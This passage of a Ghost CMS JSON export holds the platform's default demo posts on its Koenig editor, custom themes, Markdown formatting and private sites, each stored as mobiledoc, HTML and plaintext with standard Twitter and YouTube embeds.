Post","slug":"v2-demo-post","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"hr\",{}],[\"embed\",{\"url\":\"https://twitter.com/TryGhost/status/761119175192420352\",\"html\":\"<blockquote class=\\\"twitter-tweet\\\"><p lang=\\\"en\\\" dir=\\\"ltr\\\">Fun announcement coming this afternoon 🙈 what could it be?</p>&mdash; Ghost (@TryGhost) <a href=\\\"https://twitter.com/TryGhost/status/761119175192420352?ref_src=twsrc%5Etfw\\\">August 4, 2016</a></blockquote>\\n<script async src=\\\"https://platform.twitter.com/widgets.js\\\" charset=\\\"utf-8\\\"></script>\\n\",\"type\":\"rich\"}],[\"image\",{\"src\":\"https://casper.ghost.org/v1.25.0/images/koenig-demo-1.jpg\",\"alt\":\"\",\"caption\":\"A regular size image\"}],[\"image\",{\"src\":\"https://casper.ghost.org/v1.25.0/images/koenig-demo-2.jpg\",\"alt\":\"\",\"cardWidth\":\"full\",\"caption\":\"It's wide\"}],[\"image\",{\"src\":\"https://casper.ghost.org/v1.25.0/images/koenig-demo-3.jpg\",\"alt\":\"\",\"cardWidth\":\"wide\",\"caption\":\"It's wider, but not widest\"}],[\"markdown\",{\"markdown\":\"Markdown content works just the way it always did, **simply** and *beautifully*.\"}],[\"code\",{\"code\":\".new-editor {\\n\\tdisplay: bock;\\n}\"}],[\"embed\",{\"url\":\"https://www.youtube.com/watch?v=CfeQTuGyiqU\",\"html\":\"<iframe width=\\\"480\\\" height=\\\"270\\\" src=\\\"https://www.youtube.com/embed/CfeQTuGyiqU?feature=oembed\\\" frameborder=\\\"0\\\" allow=\\\"autoplay; encrypted-media\\\" allowfullscreen></iframe>\",\"type\":\"video\"}],[\"html\",{\"html\":\"<div style=\\\"background:#fafafa;margin-bottom:1.5em;padding:20px 50px;\\\">\\n    <blink>hello world</blink>\\n</div>\"}]],\"markups\":[[\"strong\"],[\"code\"],[\"em\"],[\"a\",[\"href\",\"https://forum.ghost.org/t/ghost-2-0-theme-compatibility-help-support/2103\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"Hey there! Welcome to the new Ghost editor - affectionately known as \"],[0,[0],1,\"Koenig\"],[0,[],0,\".\"]]],[1,\"p\",[[0,[],0,\"Koenig is a brand new writing experience within Ghost, and follows more of a rich writing experience which you've come to expect from the best publishing platforms. Don't worry though! You can still use Markdown too, if that's what you prefer.\"]]],[1,\"p\",[[0,[],0,\"Because there are some changes to how Ghost outputs content using its new editor, we dropped this draft post into your latest update to tell you a bit about it – and simultaneously give you a chance to preview how well your theme handles these changes. So after reading this post you should both understand how everything works, and also be able to see if there are any changes you need to make to your theme in order to upgrade to Ghost 2.0.\"]]],[10,0],[1,\"h1\",[[0,[],0,\"What's new\"]]],[1,\"p\",[[0,[],0,\"The new editor is designed to allow you have a more rich editing experience, so it's no longer limited to just text and formatting options – but it can also handle rich media objects, called cards. You can insert a card either by clicking on the \"],[0,[1],1,\"+\"],[0,[],0,\" button on a new line, or typing \"],[0,[1],1,\"/\"],[0,[],0,\" on a new line to search for a particular card. \"]]],[1,\"p\",[[0,[],0,\"Here's one now:\"]]],[10,1],[1,\"p\",[[0,[],0,\"Cards are rich objects which contain content which is more than just text. To start with there are cards for things like images, markdown, html and embeds — but over time we'll introduce more cards and integrations, as well as allowing you to create your own!\"]]],[1,\"h2\",[[0,[],0,\"Some examples of possible future cards\"]]],[3,\"ul\",[[[0,[],0,\"A chart card to display dynamic data visualisations\"]],[[0,[],0,\"A recipe card to show a pre-formatted list of ingredients and instructions\"]],[[0,[],0,\"A Mailchimp card to capture new subscribers with a web form\"]],[[0,[],0,\"A recommended reading card to display a dynamic suggested story based on the current user's reading history\"]]]],[1,\"p\",[[0,[],0,\"For now, though, we're just getting started with the basics.\"]]],[1,\"h1\",[[0,[],0,\"New ways to work with images\"]]],[1,\"p\",[[0,[],0,\"Perhaps the most notable change to how you're used to interacting with Ghost is in the images. In Koenig, they're both more powerful and easier to work with in the editor itself - and in the theme, they're output slightly differently with different size options.\"]]],[1,\"p\",[[0,[],0,\"For instance, here's your plain ol' regular image:\"]]],[10,2],[1,\"p\",[[0,[],0,\"But perhaps you've got a striking panorama that you really want to stand out as your readers scroll down the page. In that case, you could use the new full-bleed image size which stretches right out to the edges of the screen:\"]]],[10,3],[1,\"p\",[[0,[],0,\"Or maybe you're looking for something in between, which will give you just a little more size to break up the vertical rhythm of the post without dominating the entire screen. If that's the case, you might like the breakout size:\"]]],[10,4],[1,\"p\",[[0,[],0,\"Each of these sizes can be selected from within the editor, and each will output a number of HTML classes for the theme to do styling with. \"]]],[1,\"p\",[[0,[],0,\"Chances are your theme will need a few small updates to take advantage of the new editor functionality. Some people might also find they need to tweak their theme layout, as the editor canvas previously output a wrapper div around its content – but no longer does. If you rely on that div for styling, you can always add it back again in your theme.\"]]],[1,\"p\",[[0,[],0,\"Oh, we have some nice new image captions, too :)\"]]],[1,\"h1\",[[0,[],0,\"What else?\"]]],[1,\"p\",[[0,[],0,\"Well, you can still write Markdown, as mentioned. In fact you'll find the entire previous Ghost editor \"],[0,[2],1,\"inside\"],[0,[],0,\" this editor. If you want to use it then just go ahead and add a Markdown card and start writing like nothing changed at all:\"]]],[10,5],[1,\"p\",[[0,[],0,\"of course you can embed code blocks\"]]],[10,6],[1,\"p\",[[0,[],0,\"or embed things from external services like YouTube...\"]]],[10,7],[1,\"p\",[[0,[],0,\"and yeah you can do full HTML if you need to, as well!\"]]],[10,8],[1,\"p\",[[0,[],0,\"So everything works, hopefully, just about how you would expect. It's like the old editor, but faster, cleaner, prettier, and a whole lot more powerful.\"]]],[1,\"h1\",[[0,[],0,\"What do I do with this information?\"]]],[1,\"p\",[[0,[],0,\"Preview this post on your site to see if it causes any issues with your theme. Click on the settings cog in the top right 👉🏼 corner of the editor, then click on '\"],[0,[0],1,\"Preview\"],[0,[],0,\"' next to the 'Post URL' input.\"]]],[1,\"p\",[[0,[],0,\"If everything looks good to you then there's nothing you need to do, you're all set! If you spot any issues with your design, or there are some funky display issues, then you might need to make some updates to your theme based on the new editor classes being output.\"]]],[1,\"p\",[[0,[],0,\"Head over to the \"],[0,[3],1,\"Ghost 2.0 Theme Compatibility\"],[0,[],0,\" forum topic to discuss any changes and get help if needed.\"]]],[1,\"p\",[[0,[],0,\"That's it!\"]]],[1,\"p\",[[0,[],0,\"We're looking forward to sharing more about the new editor soon\"]]]]}","html":"<p>Hey there! Welcome to the new Ghost editor - affectionately known as <strong>Koenig</strong>.</p><p>Koenig is a brand new writing experience within Ghost, and follows more of a rich writing experience which you've come to expect from the best publishing platforms. Don't worry though! You can still use Markdown too, if that's what you prefer.</p><p>Because there are some changes to how Ghost outputs content using its new editor, we dropped this draft post into your latest update to tell you a bit about it – and simultaneously give you a chance to preview how well your theme handles these changes. So after reading this post you should both understand how everything works, and also be able to see if there are any changes you need to make to your theme in order to upgrade to Ghost 2.0.</p><hr><h1 id=\"what-s-new\">What's new</h1><p>The new editor is designed to allow you have a more rich editing experience, so it's no longer limited to just text and formatting options – but it can also handle rich media objects, called cards. You can insert a card either by clicking on the <code>+</code> button on a new line, or typing <code>/</code> on a new line to search for a particular card. </p><p>Here's one now:</p><figure class=\"kg-card kg-embed-card\"><blockquote class=\"twitter-tweet\"><p lang=\"en\" dir=\"ltr\">Fun announcement coming this afternoon 🙈 what could it be?</p>&mdash; Ghost (@TryGhost) <a href=\"https://twitter.com/TryGhost/status/761119175192420352?ref_src=twsrc%5Etfw\">August 4, 2016</a></blockquote>\n<script async src=\"https://platform.twitter.com/widgets.js\" charset=\"utf-8\"></script>\n</figure><p>Cards are rich objects which contain content which is more than just text. To start with there are cards for things like images, markdown, html and embeds — but over time we'll introduce more cards and integrations, as well as allowing you to create your own!</p><h2 id=\"some-examples-of-possible-future-cards\">Some examples of possible future cards</h2><ul><li>A chart card to display dynamic data visualisations</li><li>A recipe card to show a pre-formatted list of ingredients and instructions</li><li>A Mailchimp card to capture new subscribers with a web form</li><li>A recommended reading card to display a dynamic suggested story based on the current user's reading history</li></ul><p>For now, though, we're just getting started with the basics.</p><h1 id=\"new-ways-to-work-with-images\">New ways to work with images</h1><p>Perhaps the most notable change to how you're used to interacting with Ghost is in the images. In Koenig, they're both more powerful and easier to work with in the editor itself - and in the theme, they're output slightly differently with different size options.</p><p>For instance, here's your plain ol' regular image:</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://casper.ghost.org/v1.25.0/images/koenig-demo-1.jpg\" class=\"kg-image\" alt><figcaption>A regular size image</figcaption></figure><p>But perhaps you've got a striking panorama that you really want to stand out as your readers scroll down the page. In that case, you could use the new full-bleed image size which stretches right out to the edges of the screen:</p><figure class=\"kg-card kg-image-card kg-width-full kg-card-hascaption\"><img src=\"https://casper.ghost.org/v1.25.0/images/koenig-demo-2.jpg\" class=\"kg-image\" alt><figcaption>It's wide</figcaption></figure><p>Or maybe you're looking for something in between, which will give you just a little more size to break up the vertical rhythm of the post without dominating the entire screen. If that's the case, you might like the breakout size:</p><figure class=\"kg-card kg-image-card kg-width-wide kg-card-hascaption\"><img src=\"https://casper.ghost.org/v1.25.0/images/koenig-demo-3.jpg\" class=\"kg-image\" alt><figcaption>It's wider, but not widest</figcaption></figure><p>Each of these sizes can be selected from within the editor, and each will output a number of HTML classes for the theme to do styling with. </p><p>Chances are your theme will need a few small updates to take advantage of the new editor functionality. Some people might also find they need to tweak their theme layout, as the editor canvas previously output a wrapper div around its content – but no longer does. If you rely on that div for styling, you can always add it back again in your theme.</p><p>Oh, we have some nice new image captions, too :)</p><h1 id=\"what-else\">What else?</h1><p>Well, you can still write Markdown, as mentioned. In fact you'll find the entire previous Ghost editor <em>inside</em> this editor. If you want to use it then just go ahead and add a Markdown card and start writing like nothing changed at all:</p><!--kg-card-begin: markdown--><p>Markdown content works just the way it always did, <strong>simply</strong> and <em>beautifully</em>.</p>\n<!--kg-card-end: markdown--><p>of course you can embed code blocks</p><pre><code>.new-editor {\n\tdisplay: bock;\n}</code></pre><p>or embed things from external services like YouTube...</p><figure class=\"kg-card kg-embed-card\"><iframe width=\"480\" height=\"270\" src=\"https://www.youtube.com/embed/CfeQTuGyiqU?feature=oembed\" frameborder=\"0\" allow=\"autoplay; encrypted-media\" allowfullscreen></iframe></figure><p>and yeah you can do full HTML if you need to, as well!</p><!--kg-card-begin: html--><div style=\"background:#fafafa;margin-bottom:1.5em;padding:20px 50px;\">\n    <blink>hello world</blink>\n</div><!--kg-card-end: html--><p>So everything works, hopefully, just about how you would expect. It's like the old editor, but faster, cleaner, prettier, and a whole lot more powerful.</p><h1 id=\"what-do-i-do-with-this-information\">What do I do with this information?</h1><p>Preview this post on your site to see if it causes any issues with your theme. Click on the settings cog in the top right 👉🏼 corner of the editor, then click on '<strong>Preview</strong>' next to the 'Post URL' input.</p><p>If everything looks good to you then there's nothing you need to do, you're all set! If you spot any issues with your design, or there are some funky display issues, then you might need to make some updates to your theme based on the new editor classes being output.</p><p>Head over to the <a href=\"https://forum.ghost.org/t/ghost-2-0-theme-compatibility-help-support/2103\">Ghost 2.0 Theme Compatibility</a> forum topic to discuss any changes and get help if needed.</p><p>That's it!</p><p>We're looking forward to sharing more about the new editor soon</p>","comment_id":"5f47a5ad0f03320036ca2c29","plaintext":"Hey there! Welcome to the new Ghost editor - affectionately known as Koenig.\n\nKoenig is a brand new writing experience within Ghost, and follows more of a\nrich writing experience which you've come to expect from the best publishing\nplatforms. Don't worry though! You can still use Markdown too, if that's what\nyou prefer.\n\nBecause there are some changes to how Ghost outputs content using its new\neditor, we dropped this draft post into your latest update to tell you a bit\nabout it – and simultaneously give you a chance to preview how well your theme\nhandles these changes. So after reading this post you should both understand how\neverything works, and also be able to see if there are any changes you need to\nmake to your theme in order to upgrade to Ghost 2.0.\n\n\n--------------------------------------------------------------------------------\n\nWhat's new\nThe new editor is designed to allow you have a more rich editing experience, so\nit's no longer limited to just text and formatting options – but it can also\nhandle rich media objects, called cards. You can insert a card either by\nclicking on the + button on a new line, or typing / on a new line to search for\na particular card. \n\nHere's one now:\n\n> Fun announcement coming this afternoon 🙈 what could it be?\n\n— Ghost (@TryGhost) August 4, 2016\n[https://twitter.com/TryGhost/status/761119175192420352?ref_src=twsrc%5Etfw]\nCards are rich objects which contain content which is more than just text. To\nstart with there are cards for things like images, markdown, html and embeds —\nbut over time we'll introduce more cards and integrations, as well as allowing\nyou to create your own!\n\nSome examples of possible future cards\n * A chart card to display dynamic data visualisations\n * A recipe card to show a pre-formatted list of ingredients and instructions\n * A Mailchimp card to capture new subscribers with a web form\n * A recommended reading card to display a dynamic suggested story based on the\n   current user's reading history\n\nFor now, though, we're just getting started with the basics.\n\nNew ways to work with images\nPerhaps the most notable change to how you're used to interacting with Ghost is\nin the images. In Koenig, they're both more powerful and easier to work with in\nthe editor itself - and in the theme, they're output slightly differently with\ndifferent size options.\n\nFor instance, here's your plain ol' regular image:\n\nA regular size imageBut perhaps you've got a striking panorama that you really\nwant to stand out as your readers scroll down the page. In that case, you could\nuse the new full-bleed image size which stretches right out to the edges of the\nscreen:\n\nIt's wideOr maybe you're looking for something in between, which will give you\njust a little more size to break up the vertical rhythm of the post without\ndominating the entire screen. If that's the case, you might like the breakout\nsize:\n\nIt's wider, but not widestEach of these sizes can be selected from within the\neditor, and each will output a number of HTML classes for the theme to do\nstyling with. \n\nChances are your theme will need a few small updates to take advantage of the\nnew editor functionality. Some people might also find they need to tweak their\ntheme layout, as the editor canvas previously output a wrapper div around its\ncontent – but no longer does. If you rely on that div for styling, you can\nalways add it back again in your theme.\n\nOh, we have some nice new image captions, too :)\n\nWhat else?\nWell, you can still write Markdown, as mentioned. In fact you'll find the entire\nprevious Ghost editor inside this editor. If you want to use it then just go\nahead and add a Markdown card and start writing like nothing changed at all:\n\nMarkdown content works just the way it always did, simply and beautifully.\n\nof course you can embed code blocks\n\n.new-editor {\n\tdisplay: bock;\n}\n\nor embed things from external services like YouTube...\n\nand yeah you can do full HTML if you need to, as well!\n\nhello worldSo everything works, hopefully, just about how you would expect. It's\nlike the old editor, but faster, cleaner, prettier, and a whole lot more\npowerful.\n\nWhat do I do with this information?\nPreview this post on your site to see if it causes any issues with your theme.\nClick on the settings cog in the top right 👉🏼 corner of the editor, then click\non 'Preview' next to the 'Post URL' input.\n\nIf everything looks good to you then there's nothing you need to do, you're all\nset! If you spot any issues with your design, or there are some funky display\nissues, then you might need to make some updates to your theme based on the new\neditor classes being output.\n\nHead over to the Ghost 2.0 Theme Compatibility\n[https://forum.ghost.org/t/ghost-2-0-theme-compatibility-help-support/2103] \nforum topic to discuss any changes and get help if needed.\n\nThat's it!\n\nWe're looking forward to sharing more about the new editor soon","feature_image":null,"featured":0,"type":"post","status":"draft","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"5f48b79dc6057c0001f5d2ab","created_at":"2020-08-27T12:23:09.000Z","created_by":"1","updated_at":"2020-08-27T12:23:09.000Z","updated_by":"1","published_at":"2020-08-27T12:23:09.000Z","published_by":null,"custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2bb","uuid":"eb3cba68-8dc2-463e-b024-e4abedc66100","title":"Setting up your own Ghost theme","slug":"themes","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Creating a totally custom design for your publication\\n\\nGhost comes with a beautiful default theme called Casper, which is designed to be a clean, readable publication layout and can be easily adapted for most purposes. However, Ghost can also be completely themed to suit your needs. Rather than just giving you a few basic settings which act as a poor proxy for code, we just let you write code.\\n\\nThere are a huge range of both free and premium pre-built themes which you can get from the [Ghost Theme Marketplace](http://marketplace.ghost.org), or you can simply create your own from scratch.\\n\\n[![marketplace](https://casper.ghost.org/v1.0.0/images/marketplace.jpg)](http://marketplace.ghost.org)\\n\\n> Anyone can write a completely custom Ghost theme, with just some solid knowledge of HTML and CSS\\n\\nGhost themes are written with a templating language called handlebars, which has a bunch of dynamic helpers to insert your data into template files. Like `{{author.name}}`, for example, outputs the name of the current author.\\n\\nThe best way to learn how to write your own Ghost theme is to have a look at [the source code for Casper](https://github.com/TryGhost/Casper), which is heavily commented and should give you a sense of how everything fits together.\\n\\n- `default.hbs` is the main template file, all contexts will load inside this file unless specifically told to use a different template.\\n- `post.hbs` is the file used in the context of viewing a post.\\n- `index.hbs` is the file used in the context of viewing the home page.\\n- and so on\\n\\nWe've got [full and extensive theme documentation](http://themes.ghost.org/v1.23.0/docs/about) which outlines every template file, context and helper that you can use.\\n\\nIf you want to chat with other people making Ghost themes to get any advice or help, there's also a **themes** section on our [public Ghost forum](https://forum.ghost.org/c/themes).\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>Creating a totally custom design for your publication</p>\n<p>Ghost comes with a beautiful default theme called Casper, which is designed to be a clean, readable publication layout and can be easily adapted for most purposes. However, Ghost can also be completely themed to suit your needs. Rather than just giving you a few basic settings which act as a poor proxy for code, we just let you write code.</p>\n<p>There are a huge range of both free and premium pre-built themes which you can get from the <a href=\"http://marketplace.ghost.org\">Ghost Theme Marketplace</a>, or you can simply create your own from scratch.</p>\n<p><a href=\"http://marketplace.ghost.org\"><img src=\"https://casper.ghost.org/v1.0.0/images/marketplace.jpg\" alt=\"marketplace\"></a></p>\n<blockquote>\n<p>Anyone can write a completely custom Ghost theme, with just some solid knowledge of HTML and CSS</p>\n</blockquote>\n<p>Ghost themes are written with a templating language called handlebars, which has a bunch of dynamic helpers to insert your data into template files. Like <code>{{author.name}}</code>, for example, outputs the name of the current author.</p>\n<p>The best way to learn how to write your own Ghost theme is to have a look at <a href=\"https://github.com/TryGhost/Casper\">the source code for Casper</a>, which is heavily commented and should give you a sense of how everything fits together.</p>\n<ul>\n<li><code>default.hbs</code> is the main template file, all contexts will load inside this file unless specifically told to use a different template.</li>\n<li><code>post.hbs</code> is the file used in the context of viewing a post.</li>\n<li><code>index.hbs</code> is the file used in the context of viewing the home page.</li>\n<li>and so on</li>\n</ul>\n<p>We've got <a href=\"http://themes.ghost.org/v1.23.0/docs/about\">full and extensive theme documentation</a> which outlines every template file, context and helper that you can use.</p>\n<p>If you want to chat with other people making Ghost themes to get any advice or help, there's also a <strong>themes</strong> section on our <a href=\"https://forum.ghost.org/c/themes\">public Ghost forum</a>.</p>\n<!--kg-card-end: markdown-->","comment_id":"5f47a5ad0f03320036ca2c2b","plaintext":"Creating a totally custom design for your publication\n\nGhost comes with a beautiful default theme called Casper, which is designed to\nbe a clean, readable publication layout and can be easily adapted for most\npurposes. However, Ghost can also be completely themed to suit your needs.\nRather than just giving you a few basic settings which act as a poor proxy for\ncode, we just let you write code.\n\nThere are a huge range of both free and premium pre-built themes which you can\nget from the Ghost Theme Marketplace [http://marketplace.ghost.org], or you can\nsimply create your own from scratch.\n\n [http://marketplace.ghost.org]\n\n> Anyone can write a completely custom Ghost theme, with just some solid knowledge\nof HTML and CSS\n\n\nGhost themes are written with a templating language called handlebars, which has\na bunch of dynamic helpers to insert your data into template files. Like \n{{author.name}}, for example, outputs the name of the current author.\n\nThe best way to learn how to write your own Ghost theme is to have a look at \nthe\nsource code for Casper [https://github.com/TryGhost/Casper], which is heavily\ncommented and should give you a sense of how everything fits together.\n\n * default.hbs is the main template file, all contexts will load inside this\n   file unless specifically told to use a different template.\n * post.hbs is the file used in the context of viewing a post.\n * index.hbs is the file used in the context of viewing the home page.\n * and so on\n\nWe've got full and extensive theme documentation\n[http://themes.ghost.org/v1.23.0/docs/about] which outlines every template file,\ncontext and helper that you can use.\n\nIf you want to chat with other people making Ghost themes to get any advice or\nhelp, there's also a themes section on our public Ghost forum\n[https://forum.ghost.org/c/themes].","feature_image":"https://casper.ghost.org/v1.0.0/images/design.jpg","featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"5f48b79dc6057c0001f5d2ab","created_at":"2020-08-27T12:23:09.000Z","created_by":"1","updated_at":"2020-08-27T12:23:09.000Z","updated_by":"1","published_at":"2020-08-27T12:23:10.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2bc","uuid":"50b67daf-fc97-4d0c-a750-9ecb85ffc5b1","title":"Advanced Markdown tips","slug":"advanced-markdown","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"There are lots of powerful things you can do with the Ghost editor\\n\\nIf you've gotten pretty comfortable with [all the basics](/the-editor/) of writing in Ghost, then you may enjoy some more advanced tips about the types of things you can do with Markdown!\\n\\nAs with the last post about the editor, you'll want to be actually editing this post as you read it so that you can see all the Markdown code we're using.\\n\\n\\n## Special formatting\\n\\nAs well as bold and italics, you can also use some other special formatting in Markdown when the need arises, for example:\\n\\n+ ~~strike through~~\\n+ ==highlight==\\n+ \\\\*escaped characters\\\\*\\n\\n\\n## Writing code blocks\\n\\nThere are two types of code elements which can be inserted in Markdown, the first is inline, and the other is block. Inline code is formatted by wrapping any word or words in back-ticks, `like this`. Larger snippets of code can be displayed across multiple lines using triple back ticks:\\n\\n```\\n.my-link {\\n    text-decoration: underline;\\n}\\n```\\n\\nIf you want to get really fancy, you can even add syntax highlighting using [Prism.js](http://prismjs.com/).\\n\\n\\n## Full bleed images\\n\\nOne neat trick which you can use in Markdown to distinguish between different types of images is to add a `#hash` value to the end of the source URL, and then target images containing the hash with special styling. For example:\\n\\n![walking](https://casper.ghost.org/v1.0.0/images/walking.jpg#full)\\n\\nwhich is styled with...\\n\\n```\\nimg[src$=\\\"#full\\\"] {\\n    max-width: 100vw;\\n}\\n```\\n\\nThis creates full-bleed images in the Casper theme, which stretch beyond their usual boundaries right up to the edge of the window. Every theme handles these types of things slightly differently, but it's a great trick to play with if you want to have a variety of image sizes and styles.\\n\\n\\n## Reference lists\\n\\n**The quick brown [fox][1], jumped over the lazy [dog][2].**\\n\\n[1]: https://en.wikipedia.org/wiki/Fox \\\"Wikipedia: Fox\\\"\\n[2]: https://en.wikipedia.org/wiki/Dog \\\"Wikipedia: Dog\\\"\\n\\nAnother way to insert links in markdown is using reference lists. You might want to use this style of linking to cite reference material in a Wikipedia-style. All of the links are listed at the end of the document, so you can maintain full separation between content and its source or reference.\\n\\n\\n## Creating footnotes\\n\\nThe quick brown fox[^1] jumped over the lazy dog[^2].\\n\\n[^1]: Foxes are red\\n[^2]: Dogs are usually not red\\n\\nFootnotes are a great way to add additional contextual details when appropriate. Ghost will automatically add footnote content to the very end of your post.\\n\\n\\n## Full HTML\\n\\nPerhaps the best part of Markdown is that you're never limited to just Markdown. You can write HTML directly in the Ghost editor and it will just work as HTML usually does. No limits! Here's a standard YouTube embed code as an example:\\n\\n<iframe width=\\\"560\\\" height=\\\"315\\\" src=\\\"https://www.youtube.com/embed/Cniqsc9QfDo?rel=0&amp;showinfo=0\\\" frameborder=\\\"0\\\" allowfullscreen></iframe>\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>There are lots of powerful things you can do with the Ghost editor</p>\n<p>If you've gotten pretty comfortable with <a href=\"/the-editor/\">all the basics</a> of writing in Ghost, then you may enjoy some more advanced tips about the types of things you can do with Markdown!</p>\n<p>As with the last post about the editor, you'll want to be actually editing this post as you read it so that you can see all the Markdown code we're using.</p>\n<h2 id=\"specialformatting\">Special formatting</h2>\n<p>As well as bold and italics, you can also use some other special formatting in Markdown when the need arises, for example:</p>\n<ul>\n<li><s>strike through</s></li>\n<li><mark>highlight</mark></li>\n<li>*escaped characters*</li>\n</ul>\n<h2 id=\"writingcodeblocks\">Writing code blocks</h2>\n<p>There are two types of code elements which can be inserted in Markdown, the first is inline, and the other is block. Inline code is formatted by wrapping any word or words in back-ticks, <code>like this</code>. Larger snippets of code can be displayed across multiple lines using triple back ticks:</p>\n<pre><code>.my-link {\n    text-decoration: underline;\n}\n</code></pre>\n<p>If you want to get really fancy, you can even add syntax highlighting using <a href=\"http://prismjs.com/\">Prism.js</a>.</p>\n<h2 id=\"fullbleedimages\">Full bleed images</h2>\n<p>One neat trick which you can use in Markdown to distinguish between different types of images is to add a <code>#hash</code> value to the end of the source URL, and then target images containing the hash with special styling. For example:</p>\n<p><img src=\"https://casper.ghost.org/v1.0.0/images/walking.jpg#full\" alt=\"walking\"></p>\n<p>which is styled with...</p>\n<pre><code>img[src$=&quot;#full&quot;] {\n    max-width: 100vw;\n}\n</code></pre>\n<p>This creates full-bleed images in the Casper theme, which stretch beyond their usual boundaries right up to the edge of the window. Every theme handles these types of things slightly differently, but it's a great trick to play with if you want to have a variety of image sizes and styles.</p>\n<h2 id=\"referencelists\">Reference lists</h2>\n<p><strong>The quick brown <a href=\"https://en.wikipedia.org/wiki/Fox\" title=\"Wikipedia: Fox\">fox</a>, jumped over the lazy <a href=\"https://en.wikipedia.org/wiki/Dog\" title=\"Wikipedia: Dog\">dog</a>.</strong></p>\n<p>Another way to insert links in markdown is using reference lists. You might want to use this style of linking to cite reference material in a Wikipedia-style. All of the links are listed at the end of the document, so you can maintain full separation between content and its source or reference.</p>\n<h2 id=\"creatingfootnotes\">Creating footnotes</h2>\n<p>The quick brown fox<sup class=\"footnote-ref\"><a href=\"#fn1\" id=\"fnref1\">[1]</a></sup> jumped over the lazy dog<sup class=\"footnote-ref\"><a href=\"#fn2\" id=\"fnref2\">[2]</a></sup>.</p>\n<p>Footnotes are a great way to add additional contextual details when appropriate. Ghost will automatically add footnote content to the very end of your post.</p>\n<h2 id=\"fullhtml\">Full HTML</h2>\n<p>Perhaps the best part of Markdown is that you're never limited to just Markdown. You can write HTML directly in the Ghost editor and it will just work as HTML usually does. No limits! Here's a standard YouTube embed code as an example:</p>\n<iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/Cniqsc9QfDo?rel=0&amp;showinfo=0\" frameborder=\"0\" allowfullscreen></iframe>\n<hr class=\"footnotes-sep\">\n<section class=\"footnotes\">\n<ol class=\"footnotes-list\">\n<li id=\"fn1\" class=\"footnote-item\"><p>Foxes are red <a href=\"#fnref1\" class=\"footnote-backref\">↩︎</a></p>\n</li>\n<li id=\"fn2\" class=\"footnote-item\"><p>Dogs are usually not red <a href=\"#fnref2\" class=\"footnote-backref\">↩︎</a></p>\n</li>\n</ol>\n</section>\n<!--kg-card-end: markdown-->","comment_id":"5f47a5ad0f03320036ca2c2d","plaintext":"There are lots of powerful things you can do with the Ghost editor\n\nIf you've gotten pretty comfortable with all the basics [/the-editor/] of\nwriting in Ghost, then you may enjoy some more advanced tips about the types of\nthings you can do with Markdown!\n\nAs with the last post about the editor, you'll want to be actually editing this\npost as you read it so that you can see all the Markdown code we're using.\n\nSpecial formatting\nAs well as bold and italics, you can also use some other special formatting in\nMarkdown when the need arises, for example:\n\n * strike through\n * highlight\n * *escaped characters*\n\nWriting code blocks\nThere are two types of code elements which can be inserted in Markdown, the\nfirst is inline, and the other is block. Inline code is formatted by wrapping\nany word or words in back-ticks, like this. Larger snippets of code can be\ndisplayed across multiple lines using triple back ticks:\n\n.my-link {\n    text-decoration: underline;\n}\n\n\nIf you want to get really fancy, you can even add syntax highlighting using \nPrism.js [http://prismjs.com/].\n\nFull bleed images\nOne neat trick which you can use in Markdown to distinguish between different\ntypes of images is to add a #hash value to the end of the source URL, and then\ntarget images containing the hash with special styling. For example:\n\n\n\nwhich is styled with...\n\nimg[src$=\"#full\"] {\n    max-width: 100vw;\n}\n\n\nThis creates full-bleed images in the Casper theme, which stretch beyond their\nusual boundaries right up to the edge of the window. Every theme handles these\ntypes of things slightly differently, but it's a great trick to play with if you\nwant to have a variety of image sizes and styles.\n\nReference lists\nThe quick brown fox [https://en.wikipedia.org/wiki/Fox], jumped over the lazy \ndog [https://en.wikipedia.org/wiki/Dog].\n\nAnother way to insert links in markdown is using reference lists. You might want\nto use this style of linking to cite reference material in a Wikipedia-style.\nAll of the links are listed at the end of the document, so you can maintain full\nseparation between content and its source or reference.\n\nCreating footnotes\nThe quick brown fox[1] jumped over the lazy dog[2].\n\nFootnotes are a great way to add additional contextual details when appropriate.\nGhost will automatically add footnote content to the very end of your post.\n\nFull HTML\nPerhaps the best part of Markdown is that you're never limited to just Markdown.\nYou can write HTML directly in the Ghost editor and it will just work as HTML\nusually does. No limits! Here's a standard YouTube embed code as an example:\n\n\n--------------------------------------------------------------------------------\n\n 1. Foxes are red ↩︎\n    \n    \n 2. Dogs are usually not red ↩︎","feature_image":"https://casper.ghost.org/v1.0.0/images/advanced.jpg","featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"5f48b79dc6057c0001f5d2ab","created_at":"2020-08-27T12:23:09.000Z","created_by":"1","updated_at":"2020-08-27T12:23:09.000Z","updated_by":"1","published_at":"2020-08-27T12:23:11.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2bd","uuid":"71aa5814-cfca-46d6-8e15-542b312953ec","title":"Making your site private","slug":"private-sites","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Sometimes you might want to put your site behind closed doors\\n\\nIf you've got a publication that you don't want the world to see yet because it's not ready to launch, you can hide your Ghost site behind a simple shared pass-phrase.\\n\\nYou can toggle this preference on at the bottom of Ghost's General Settings\\n\\n![private](https://casper.ghost.org/v1.0.0/images/private.png)\\n\\nGhost will give you a short, randomly generated pass-phrase which you can share with 